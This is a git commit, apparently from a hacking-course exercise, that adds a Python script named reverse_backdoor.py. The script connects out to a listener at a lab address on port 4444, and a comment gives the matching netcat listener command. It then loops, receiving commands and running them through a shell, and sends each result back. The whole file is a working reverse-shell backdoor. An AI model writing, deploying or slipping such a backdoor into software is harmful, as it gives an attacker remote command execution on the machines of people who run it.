e43957b9fb5a804d23760920ca3e021ce14d67a6
my9143434 <my9143434@gmail.com>
2019-07-21 16:00:53 -0700

    time sleep

---
+++ reverse_backdoor.py
@@ -0,0 +1,22 @@
+#!/usr/bin/env python
+
+import socket, subprocess, time
+
+def execute_system_command(command):
+	return subprocess.check_output(command, shell=True)
+
+# nc -vv -l -p 4444
+# establish connection
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connection.connect(("10.0.2.15", 4444))	# tuple
+
+connection.send("\n[+] Conneciton established.\n")
+
+time.sleep(10)
+
+while True:
+	command = connection.recv(1024) # batch 1024bytes
+	command_result = execute_system_command(command) # whoami
+	connection.send(command_result)
+
+connection.close()
